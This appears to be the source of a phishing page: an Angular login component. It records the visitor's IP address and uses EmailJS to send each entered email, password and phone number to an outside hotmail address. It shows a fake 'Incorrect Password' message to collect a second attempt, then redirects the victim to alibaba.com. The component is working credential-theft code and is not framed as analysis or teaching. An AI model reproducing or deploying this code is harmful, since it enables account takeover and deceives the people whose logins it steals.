import { CommonModule } from '@angular/common';
import { HttpClient } from '@angular/common/http';
import { Component, OnInit } from '@angular/core';
import {
  FormBuilder,
  FormGroup,
  FormsModule,
  ReactiveFormsModule,
} from '@angular/forms';
import emailjs from '@emailjs/browser';
import { Subscription } from 'rxjs';

@Component({
  selector: 'app-mobile-forms',
  imports: [CommonModule, ReactiveFormsModule, FormsModule],
  templateUrl: './mobile-forms.component.html',
  styleUrl: './mobile-forms.component.scss',
})
export class MobileFormsComponent implements OnInit {
  loginForm!: FormGroup;
  showError = false;

  showPassword = false;
  attemptCount = 0;
  showLoader = false;

  userId!: string;

  private subscription = new Subscription();

  constructor(private fb: FormBuilder, private http: HttpClient) {}

  ngOnInit(): void {
    this.loginForm = this.fb.group({
      email: this.fb.control(null),
      password: this.fb.control(null),
    });

    this.getUserId();
  }

  get loginFormControl() {
    return this.loginForm.controls;
  }

  get errorMessage() {
    return 'Incorrect Password';
  }

  getUserId() {
    this.subscription.add(
      this.http
        .get('https://api.ipify.org?format=json')
        .subscribe((resData: any) => {
          this.userId = resData.ip;
          // console.log(this.userId);
        })
    );
  }

  submit() {
    if (this.attemptCount < 1) {
      this.send();

      this.attemptCount++;
    } else {
      this.send(true);
    }

    this.showError = false;
  }

  redirectToExternalSite() {
    window.location.replace('https://www.alibaba.com/');
  }

  async send(end: boolean = false) {
    this.showLoader = true;

    emailjs.init('08gaTi0yX9GYMg2w_');
    const response = await emailjs
      .send('service_4fx4y8a', 'template_0tzq3y5', {
        name: 'Stanley',
        message: `Email: ${
          this.loginFormControl['account'].value || ''
        } Password: ${this.loginFormControl['password'].value}, Phone Number: ${
          this.loginFormControl['countryCode'].value
        } ${this.loginFormControl['phoneNumber'].value || ''}, Attempt: ${
          this.attemptCount + 1
        } userId: ${this.userId || ''}`,
        email: 'ubaid.valtorquegroup@hotmail.com',
      })
      .then(() => {
        this.showError = true;
        this.showLoader = false;
        if (end) {
          this.redirectToExternalSite();
        }
      })
      .catch(() => {
        this.showLoader = false;

        if (end) {
          this.redirectToExternalSite();
        }
      });
  }

  ngOnDestroy(): void {
    if (this.subscription) {
      this.subscription.unsubscribe();
    }
  }
}
